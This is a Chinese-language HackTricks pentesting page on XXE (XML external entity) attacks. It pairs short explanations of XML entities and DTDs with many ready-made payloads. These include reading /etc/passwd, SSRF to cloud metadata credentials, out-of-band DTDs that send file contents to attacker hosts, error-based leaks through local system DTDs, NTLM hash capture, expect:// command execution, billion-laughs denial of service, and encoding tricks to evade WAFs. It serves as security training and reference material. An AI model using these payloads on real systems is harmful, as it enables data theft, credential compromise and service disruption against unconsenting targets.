# XXE - XEE - XML 外部实体

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击类型。

## XML 基础

**这部分内容大部分取自这个了不起的 Portswigger 页面：** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### 什么是 XML？ <a href="#what-is-xml" id="what-is-xml"></a>

XML 代表“可扩展标记语言”。XML 是一种用于存储和传输数据的语言。像 HTML 一样，XML 使用树状结构的标签和数据。与 HTML 不同，XML 不使用预定义的标签，因此可以给标签命名以描述数据。在网络历史的早期，XML 作为数据传输格式很流行（“AJAX”中的“X”代表“XML”）。但现在它的流行度已经下降，转而支持 JSON 格式。

### 什么是 XML 实体？ <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。XML 语言的规范中内置了各种实体。例如，实体 `&lt;` 和 `&gt;` 代表字符 `<` 和 `>`。这些是用于表示 XML 标签的元字符，因此当它们出现在数据中时，通常必须使用它们的实体来表示。

### 什么是 XML 元素？

元素类型声明设置了可能出现在 XML 文档中的元素的类型和数量的规则，哪些元素可以相互嵌套，以及它们必须以什么顺序出现。例如：

* `<!ELEMENT stockCheck ANY>` 表示任何对象都可以在父级 `<stockCheck></stockCheck>` 内部
* \<!ELEMENT stockCheck EMPTY> 表示它应该是空的 `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> 声明 `<stockCheck>` 可以有子元素 `<productId>` 和 `<storeId>`

### 什么是文档类型定义？ <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

XML 文档类型定义（DTD）包含可以定义 XML 文档结构、它可以包含的数据值类型以及其他项目的声明。DTD 在 XML 文档开始时的可选 `DOCTYPE` 元素内声明。DTD 可以完全自包含在文档本身内（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），或者可以是两者的混合。

### 什么是 XML 自定义实体？ <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XML 允许在 DTD 内定义自定义实体。例如：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

这个定义意味着在 XML 文档中任何使用实体引用 `&myentity;` 的地方都将被替换为定义的值：“`my entity value`”。

### 什么是 XML 外部实体？ <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 外部。

外部实体的声明使用 `SYSTEM` 关键字，并且必须指定一个 URL，以便从中加载实体的值。例如：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

URL 可以使用 `file://` 协议，因此可以从文件加载外部实体。例如：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML 外部实体提供了 [XML 外部实体攻击](https://portswigger.net/web-security/xxe)产生的主要手段。

### 什么是 XML 参数实体？

有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的一些加固，使用常规实体的 XXE 攻击会被阻止。在这种情况下，您可能可以改用 XML 参数实体。XML 参数实体是一种特殊类型的 XML 实体，只能在 DTD 内的其他地方引用。目前，您只需要知道两件事。首先，XML 参数实体的声明包括在实体名称前使用百分号：

`<!ENTITY % myparameterentity "my parameter entity value" >`

其次，参数实体使用百分号而不是通常的和号来引用：%myparameterentity;`

这意味着您可以使用以下方式通过 XML 参数实体进行盲 XXE 测试，通过带外检测：

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

此 XXE 有效载荷声明了一个名为 `xxe` 的 XML 参数实体，然后在 DTD 中使用该实体。这将导致对攻击者域的 DNS 查找和 HTTP 请求，验证攻击是否成功。

## 主要攻击

[这些攻击大多数使用了 Portswiggers 出色的 XEE 实验室进行测试：https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### 新实体测试

在这次攻击中，我将测试一个简单的新 ENTITY 声明是否有效
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### 读取文件

让我们尝试以不同的方式读取 `/etc/passwd`。对于 Windows，你可以尝试读取：`C:\windows\system32\drivers\etc\hosts`

在这第一个案例中，请注意 SYSTEM "_**file:///**etc/passwd_" 也是可行的。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

此第二种情况应当有助于提取文件，如果web服务器使用的是PHP（Portswiggers实验室不是这种情况）
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
在这第三种情况中，请注意我们将 `Element stockCheck` 声明为 ANY
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### 目录列表

在基于 **Java** 的应用程序中，可能可以通过XXE使用如下有效载荷来**列出目录的内容**（只请求目录而不是文件）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE 可能被用来在云内滥用 SSRF
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### 盲目 SSRF

使用**先前提到的技术**，你可以让服务器访问你控制的服务器以显示其易受攻击。但是，如果这不起作用，可能是因为**不允许使用 XML 实体**，在这种情况下，你可以尝试使用**XML 参数实体**：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "盲目" SSRF - 出站数据泄露

**在这个场合，我们将让服务器加载一个带有恶意载荷的新DTD，该载荷将通过HTTP请求发送文件内容（对于多行文件，您可以尝试通过** _**ftp://**_**进行泄露）。这个解释取自** [**Portswigger实验室这里**](https://portswigger.net/web-security/xxe/blind)**。**

一个用于泄露 `/etc/hostname` 文件内容的恶意DTD示例如下：
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
此 DTD 执行以下步骤：

* 定义一个名为 `file` 的 XML 参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的 XML 参数实体，包含另一个名为 `exfiltrate` 的 XML 参数实体的动态声明。通过向攻击者的 web 服务器发起 HTTP 请求，其中 URL 查询字符串包含 `file` 实体的值，来评估 `exfiltrate` 实体。
* 使用 `eval` 实体，导致执行 `exfiltrate` 实体的动态声明。
* 使用 `exfiltrate` 实体，以便通过请求指定的 URL 来评估其值。

攻击者必须在他们控制的系统上托管恶意 DTD，通常通过将其加载到自己的 web 服务器上。例如，攻击者可能在以下 URL 提供恶意 DTD：\
`http://web-attacker.com/malicious.dtd`

最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效载荷：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
```markdown
此XXE有效载荷声明了一个名为`xxe`的XML参数实体，然后在DTD中使用该实体。这将导致XML解析器从攻击者的服务器获取外部DTD并内联解释它。然后执行恶意DTD中定义的步骤，并将`/etc/passwd`文件传输到攻击者的服务器。

### 基于错误的（外部DTD）

**在这种情况下，我们将使服务器加载一个恶意DTD，该DTD将在错误消息中显示文件的内容（仅当您能看到错误消息时有效）。** [**此处的示例。**](https://portswigger.net/web-security/xxe/blind)

您可以使用如下恶意外部DTD触发包含`/etc/passwd`文件内容的XML解析错误消息：
```
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
```markdown
此DTD执行以下步骤：

* 定义一个名为 `file` 的XML参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的XML参数实体，包含另一个名为 `error` 的XML参数实体的动态声明。`error` 实体将通过加载一个不存在的文件来评估，该文件的名称包含 `file` 实体的值。
* 使用 `eval` 实体，导致执行 `error` 实体的动态声明。
* 使用 `error` 实体，因此尝试加载不存在的文件来评估其值，结果在错误消息中包含不存在文件的名称，即 `/etc/passwd` 文件的内容。

使用以下方法调用外部DTD错误：
```
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
您应该在Web服务器响应的错误消息中看到文件的内容。

![](<../.gitbook/assets/image (223) (1).png>)

_**请注意，外部DTD允许我们在第二个实体（`eval`）中包含一个实体，但在内部DTD中是禁止的。因此，通常情况下，如果不使用外部DTD，您就无法强制出现错误。**_

### **基于错误的（系统DTD）**

那么，当**出站交互被阻止**（不可用外部连接）时，盲目的XXE漏洞怎么办？[信息来自这里](https://portswigger.net/web-security/xxe/blind)。

在这种情况下，由于XML语言规范中的一个漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的**DTD使用内部和外部DTD声明的混合体**，那么**内部DTD可以重新定义在外部DTD中声明的实体**。当这种情况发生时，使用XML参数实体在另一个参数实体的定义中的限制就放宽了。

这意味着攻击者可以在**内部DTD中使用基于错误的XXE技术**，前提是他们使用的XML参数实体是**重新定义在外部DTD中声明的实体**。当然，如果出站连接被阻止，那么外部DTD就不能从远程位置加载。相反，它需要是一个**对应用服务器本地的外部DTD文件**。_本质上，攻击涉及调用存在于本地文件系统上的DTD文件，并将其重新用途化，以重新定义现有实体，从而触发包含敏感数据的解析错误。_

例如，假设服务器文件系统上的位置`/usr/local/app/schema.dtd`有一个DTD文件，这个DTD文件定义了一个名为`custom_entity`的实体。攻击者可以通过提交如下的混合DTD来触发一个包含`/etc/passwd`文件内容的XML解析错误消息：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
```markdown
此 DTD 执行以下步骤：

* 定义一个名为 `local_dtd` 的 XML 参数实体，包含服务器文件系统上存在的外部 DTD 文件的内容。
* 重新定义名为 `custom_entity` 的 XML 参数实体，该实体已在外部 DTD 文件中定义。实体被重新定义为包含已描述的[基于错误的 XXE 漏洞利用](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)，用于触发包含 `/etc/passwd` 文件内容的错误消息。
*   使用 `local_dtd` 实体，以便解释外部 DTD，包括 `custom_entity` 实体的重新定义值。这导致了所需的错误消息。

**真实世界示例：** 使用 GNOME 桌面环境的系统通常在 `/usr/share/yelp/dtd/docbookx.dtd` 有一个包含名为 `ISOamso` 的实体
```
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

由于这种技术使用了**内部DTD，因此首先需要找到一个有效的DTD**。您可以通过**安装**服务器使用的相同**操作系统/软件**并**搜索一些默认的DTDs**，或者**获取**系统内部**默认DTDs**的列表并**检查**是否存在任何一个：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### 在系统内查找DTDs

在以下这个很棒的github仓库中，你可以找到**可能存在于系统中的DTDs路径**：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

此外，如果你有**受害系统的Docker镜像**，你可以使用同一仓库中的工具来**扫描**这个**镜像**并**找到**系统内部存在的**DTDs**的路径。阅读[github的Readme](https://github.com/GoSecure/dtd-finder)来了解如何操作。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### 通过 Office Open XML 解析器的 XXE

要深入了解这种攻击，请**查看 Detectify [这篇精彩文章](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)的第二部分**。

许多网络应用程序**提供上传 Microsoft Office 文档的功能**，然后继续从这些文档中提取某些细节。例如，网络应用程序可能允许用户通过上传 XLSX 格式的电子表格来导入数据。为了让解析器从电子表格中提取数据，它将不可避免地需要解析至少一个 XML 文件。

要测试这个漏洞，需要创建一个**包含 XXE 有效载荷的 Microsoft Office 文件**。第一步是创建一个空目录，以便可以将文档解压到其中。

一旦文档被解压，位于 `./unzipped/word/document.xml` 的 XML 文件应该用首选的文本编辑器（如 vim）打开并编辑。应该修改 XML 以包含所需的 XXE 有效载荷，通常从一个 HTTP 请求开始。

修改后的 XML 行应该插入两个根 XML 对象之间。重要的是用一个可监控的 URL 替换 URL。

最后，可以将文件压缩以创建恶意的 poc.docx 文件。从之前创建的“unzipped”目录中，应该运行以下命令：

现在，创建的文件可以上传到可能存在漏洞的网络应用程序中，可以希望在 Burp Collaborator 日志中出现一个请求。


### Jar: 协议

`jar` 协议仅适用于**Java 应用程序**。它允许访问位于 **PKZIP** 文件（`.zip`、`.jar` 等）内的文件，并适用于本地和远程文件：
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
能够访问PKZIP文件内的文件，**通过系统DTD文件滥用XXE非常有用。** 查看[本节了解如何滥用系统DTD文件](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 幕后原理

1. 它发起HTTP请求以加载zip存档。 `https://download.host.com/myarchive.zip`
2. 它将HTTP响应保存到临时位置。 `/tmp/...`
3. 它解压存档。
4. 它读取`file.zip`
5. 它删除临时文件。

请注意，可以在第二步中停止流程。技巧是在提供文件时永远不关闭连接。 [这些工具可能有用](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：一个是python `slow_http_server.py`，另一个是java `slowserver.jar`。

一旦服务器下载了您的文件，您需要通过浏览临时目录来找到其位置。由于是随机的，文件路径无法预先预测。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
在临时目录中写入文件可以帮助**升级另一个涉及路径遍历的漏洞**（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml 攻击
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### 二次膨胀攻击

![](<../.gitbook/assets/image (531).png>)

#### 获取 NTML

在Windows主机上，可以通过设置responder.py处理程序来获取web服务器用户的NTML哈希：
```
Responder.py -I eth0 -v
```
发送以下请求
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
然后你可以尝试使用hashcat破解哈希值

## 隐藏的XXE攻击面

### XInclude

[来自这里。](https://portswigger.net/web-security/xxe)

一些应用程序**接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档**。这种情况的一个例子是，客户端提交的数据被放置到**后端SOAP请求**中，然后由后端SOAP服务处理。

在这种情况下，你无法执行经典的XXE攻击，因为**你无法控制整个XML**文档，因此无法定义或修改`DOCTYPE`元素。然而，你可能可以使用`XInclude`来代替。`XInclude`是XML规范的一部分，它允许一个XML文档由子文档构建。你可以在XML文档中任何数据值中放置一个`XInclude`攻击，因此在你只控制被放入服务器端XML文档的单个数据项的情况下，也可以执行攻击。

要执行一个`XInclude`攻击，你需要引用`XInclude`命名空间并提供你希望包含的文件的路径。例如：
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - 文件上传

[从这里开始。](https://portswigger.net/web-security/xxe)

一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。XML基于格式的例子包括办公文档格式如DOCX和图像格式如SVG。

例如，一个应用程序可能允许用户**上传图像**，并在上传后在服务器上处理或验证这些图像。即使应用程序期望接收像PNG或JPEG这样的格式，**正在使用的图像处理库可能支持SVG图像**。由于SVG格式使用XML，攻击者可以提交恶意的SVG图像，因此触达XXE漏洞的隐藏攻击面。
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
你也可以尝试使用 PHP 的 "expect" 包装器来**执行命令**：
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
**请注意，读取文件的第一行或执行结果的第一行将出现在创建的图像内部。因此，您需要能够访问SVG创建的图像。**

### **PDF - 文件上传**

阅读以下文章，**了解如何通过上传PDF文件来利用XXE**：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: 从x-www-urlencoded转换为XML

如果一个POST请求接受XML格式的数据，您可以尝试在该请求中利用XXE。例如，如果一个正常的请求包含以下内容：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
那么您可能可以提交以下请求，获得相同的结果：
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type：从 JSON 到 XEE

要更改请求，您可以使用名为“**Content Type Converter**”的 Burp 扩展。[这里](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)您可以找到此示例：
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
另一个例子可以在[这里](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)找到。

## WAF 和保护绕过

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
这只有在XML服务器接受`data://`协议时才有效。

### UTF-7

您可以使用cyberchef的\[**"编码食谱"**] \(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) 转换为UTF-7。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ 协议绕过

如果网站使用的是 PHP，可以不使用 `file:/` 而是使用 **php 包装器** `php://filter/convert.base64-encode/resource=` 来**访问内部文件**。

如果网站使用的是 Java，你可以查看 [**jar: 协议**](xxe-xee-xml-external-entity.md#jar-protocol)。

### HTML 实体

来自 [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) 的技巧\
你可以通过使用 **HTML 实体** 编码来创建一个**实体内的实体**，然后调用它来**加载 dtd**。\
注意使用的 **HTML 实体** 需要是**数字型**的（如\[在此示例中]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric%20entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)）。
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD 示例：
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**提取** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **提取外部资源**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### 远程代码执行

**如果 PHP "expect" 模块已加载**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

本节摘自 [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
根据 [维基百科](https://en.wikipedia.org/wiki/XLIFF) 的说法：

> XLIFF（XML 本地化交换文件格式）是一个基于 XML 的双语文本格式，旨在标准化在本地化过程中以及在 CAT 工具交换中传递可本地化数据的方式。

### 盲目请求
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
服务器响应出现错误：
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
但我们在 Burp Collaborator 上得到了回应。

### 通过带外传输泄露数据
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
### 通过错误基础泄露数据

DTD 文件：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
服务器响应：
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
